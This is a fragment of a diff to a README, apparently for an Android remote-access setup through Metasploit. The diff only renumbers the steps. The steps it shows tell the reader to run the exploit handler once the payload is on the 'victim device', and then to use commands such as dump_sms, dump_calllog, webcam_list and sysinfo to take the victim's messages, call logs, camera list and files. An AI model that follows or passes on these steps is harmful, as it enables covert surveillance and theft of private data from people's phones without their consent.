@@ -70,14 +70,14 @@ set LPORT {port}
 
 exploit
 
-14. Hit enter to exploit make sure you have successfully install the payload to the victim device.
+15. Hit enter to exploit make sure you have successfully install the payload to the victim device.
 ![Screenshot 2025-01-02 193214](https://github.com/user-attachments/assets/34c56c34-e7d3-4306-891c-24bbdea74026)
 
-15. It will get connect to victim device now you can have access to it file manager,sms,calllogs,sysinfo,camer,etc.
+16. It will get connect to victim device now you can have access to it file manager,sms,calllogs,sysinfo,camer,etc.
 ![Screenshot 2025-01-02 193448](https://github.com/user-attachments/assets/82ba145d-a55d-4233-a6d7-54962bff0814)
 ![Screenshot 2025-01-02 193458](https://github.com/user-attachments/assets/942e9f88-17c3-4501-af78-e9713cbc193c)
 
-16. once connection is successfull try using (dump_sms for sms ,dump_calllog for call logs ,webcam_list , sysinfo for system info, ls to list dir)
+17. once connection is successfull try using (dump_sms for sms ,dump_calllog for call logs ,webcam_list , sysinfo for system info, ls to list dir)
 ![Screenshot 2025-01-02 193517](https://github.com/user-attachments/assets/c42653cf-0695-4f88-8549-3041b24862b4)
 ![Screenshot 2025-01-02 193535](https://github.com/user-attachments/assets/babd95e8-5496-4bac-bb62-8ab251baf7e2)
 # Sms output
